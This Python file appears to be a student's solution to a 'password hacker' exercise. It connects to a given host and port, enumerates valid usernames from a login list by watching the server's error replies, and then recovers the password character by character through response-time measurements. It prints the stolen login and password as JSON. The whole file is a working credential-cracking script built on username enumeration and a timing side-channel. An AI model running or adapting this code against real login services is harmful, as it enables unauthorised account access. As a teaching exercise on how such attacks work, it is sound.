# write your code here

import socket
from sys import argv
from itertools import product
from string import ascii_lowercase, ascii_uppercase, digits
from datetime import datetime
from time import sleep
import json

def permute_letters(s):

    return list( map(''.join, product(*((c.upper(), c.lower()) if c.isalpha() else c for c in s  ))) )


def main():

    if len(argv) == 1:
        print("Parameter list is empty")
        exit()
    elif len(argv) != 3:
        print("Length of parameter list is wrong")
        exit()

    hostname = argv[1]
    port = int(argv[2])
    #data = argv[3]

    buffer_size = 1024

    address = (hostname, port)


    admin_login = ""
    admin_password = ""

    pwd_pool = ascii_lowercase + ascii_uppercase + digits

    test_counter = 0
    exit_flag = False


    with socket.socket() as client_socket:

        client_socket.connect(address)

        with open('.\logins.txt','r') as f:

            for login in f:

                # remove redundant \n\r or \n
                login = login.strip()

                login_json = { "login": login, "password": " "}

                # generate attack data by dictionary
                # convert python dict to JSON string
                attack_data = json.dumps(login_json)


                # covert from string to byte
                data = attack_data.encode('utf-8')


                try:
                    # send data from client to server
                    client_socket.send(data)

                    # receive data from server to client
                    response = client_socket.recv(buffer_size)

                    # convert from byte to string
                    response = response.decode('utf-8')


                except Exception as e:
                    print(f'exit flag during login {exit_flag}')
                    print(f'test count during login {test_counter}')
                    print(e)

                test_counter += 1

                response_dict = json.loads(response)

                if response_dict["result"] == 'Wrong password!':

                    # current login account is correct
                    # save current login account
                    admin_login = login
                    break


        while not exit_flag:

            for char in pwd_pool:
                cur_pwd = admin_password + char

                login_json = { "login": admin_login, "password": cur_pwd}

                # generate attack data by brute force on a-zA-Z0-9
                # convert python dict to JSON string
                attack_data = json.dumps(login_json)

                # covert from string to byte
                data = attack_data.encode('utf-8')

                start, finish = 0, 0
                try:
                    # timer start
                    start = datetime.now()

                    # send data from client to server
                    client_socket.send(data)

                    # receive data from server to client
                    response = client_socket.recv(buffer_size)

                    # timer stop
                    finish = datetime.now()

                    # convert from byte to string
                    response = response.decode('utf-8')

                    test_counter += 1

                    response_dict = json.loads(response)

                except Exception as e:
                    #Print error message and status at that moment
                    print(login_json)
                    print(response)
                    print(e)
                    exit()

                response_result = response_dict["result"]


                if response_result == "Wrong password!" and (finish-start).total_seconds() >= 0.1:
                    # if time delay is larger than 0.1 second, then current char is a good guess
                    admin_password = admin_password + char
                    continue

                elif response_result == "Connection success!":
                    # current password is correct.
                    admin_password = cur_pwd

                    # output final result of login ID and password in terms of JSON string
                    login_json = { "login": admin_login, "password": admin_password}

                    login_pwd_str = json.dumps(login_json, indent=4)
                    print(login_pwd_str)

                    exit_flag = True
                    break


    return



# Entry point of program
if __name__ == '__main__':

    main()
